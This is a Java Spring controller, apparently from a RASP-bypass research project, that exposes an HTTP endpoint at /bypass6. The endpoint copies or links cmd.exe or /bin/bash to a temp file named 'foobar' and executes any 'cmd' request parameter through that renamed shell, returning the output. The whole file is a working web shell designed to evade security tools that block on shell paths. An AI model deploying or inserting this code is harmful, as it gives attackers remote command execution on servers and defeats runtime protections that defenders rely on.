package com.example.raspbypass.controller;

import com.example.raspbypass.Util.EvilClass;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

@Controller
@RequestMapping("/bypass6")
public class Bypass6 {
    private static final Path EVIL_TARGET_PATH = Paths.get(System.getProperty("java.io.tmpdir") + File.separator + "foobar");
    private static Path EVIL_FILE_PATH;
    static {
        if (EvilClass.isWin()){
            EVIL_FILE_PATH = Paths.get("C:\\Windows\\System32\\cmd.exe");
        }else {
            EVIL_FILE_PATH = Paths.get("/bin/bash");
        }
    }
    @GetMapping("/")
    public void bypassBlackList(HttpServletRequest request, HttpServletResponse response) throws Exception{
        File file = EVIL_TARGET_PATH.toFile();
        if(file.exists()){
            file.delete();
        }
        String op = request.getParameter("op");
        switch (op){
            case "copy":
                Files.copy(EVIL_FILE_PATH,EVIL_TARGET_PATH);
                break;
            case "softlink":
                Files.createSymbolicLink(EVIL_TARGET_PATH,EVIL_FILE_PATH);
                break;
            case "hardlink":
                Files.createLink(EVIL_TARGET_PATH,EVIL_FILE_PATH);
                break;
            default:
                break;
        }
        String cmd = request.getParameter("cmd");
        String result = exec(cmd);
        response.getWriter().write(result);

    }
    private static String exec(String cmd) throws Exception{
        String[] command;
        if (EvilClass.isWin()) {
            command = new String[]{EVIL_TARGET_PATH.toString(), "/c", cmd};
        } else {
            command = new String[]{EVIL_TARGET_PATH.toString(), "-c", cmd};
        }
        if (cmd != null) {
            InputStream in = null;
            in = Runtime.getRuntime().exec(command).getInputStream();
            Scanner scanner = new Scanner(in).useDelimiter("\\A");
            String out = scanner.hasNext() ? scanner.next() : "";
            return out;
        } else {
            return "Null";
        }
    }

}
